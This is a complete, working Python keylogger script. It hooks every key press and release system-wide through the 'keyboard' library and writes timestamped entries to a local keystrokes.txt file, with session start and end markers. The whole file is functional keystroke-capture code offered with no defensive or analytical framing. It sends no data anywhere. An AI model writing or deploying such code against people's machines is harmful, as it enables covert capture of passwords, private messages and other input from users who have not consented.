import keyboard
import datetime
import time
from collections import deque

LOG_FILE = 'keystrokes.txt'
BUFFER_SIZE = 10

class Keylogger:
    def __init__(self, log_file=LOG_FILE, buffer_size=BUFFER_SIZE):
        self.log_file = log_file
        self.buffer_size = buffer_size
        self.log_buffer = deque()
        self.start_time = datetime.datetime.now()

    def format_key(self, key_name):
        if key_name == 'space':
            return ' '
        elif key_name == 'enter':
            return '[ENTER]\n'
        elif key_name == 'tab':
            return '[TAB]'
        elif key_name == 'backspace':
            return '[BACKSPACE]'
        elif len(key_name) > 1:
            return f'[{key_name.upper()}]'
        else:
            return key_name

    def log_keystroke(self, event, action):
        key_name = self.format_key(event.name)
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.log_buffer.append(f'{timestamp} - {action.upper()}: {key_name}\n')
        if len(self.log_buffer) >= self.buffer_size:
            self.flush_log()

    def flush_log(self):
        with open(self.log_file, 'a') as f:
            while self.log_buffer:
                f.write(self.log_buffer.popleft())

    def write_session_header(self):
        start_time_str = self.start_time.strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_file, 'a') as f:
            f.write(f'\n--- Session started at {start_time_str} ---\n')

    def write_session_footer(self):
        end_time = datetime.datetime.now()
        duration = end_time - self.start_time
        end_time_str = end_time.strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_file, 'a') as f:
            f.write(f'--- Session ended at {end_time_str} (Duration: {duration}) ---\n\n')

    def on_key_press(self, event):
        self.log_keystroke(event, 'pressed')

    def on_key_release(self, event):
        self.log_keystroke(event, 'released')

    def start(self):
        self.write_session_header()
        keyboard.on_press(self.on_key_press)
        keyboard.on_release(self.on_key_release)
        print('Keylogger started. Press Ctrl+C to stop.')

    def stop(self):
        keyboard.unhook_all()
        self.flush_log()
        self.write_session_footer()
        print('Keylogger stopped.')

if __name__ == "__main__":
    keylogger = Keylogger()
    try:
        keylogger.start()
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        keylogger.stop()
    except Exception as e:
        print(f'An error occurred: {e}')
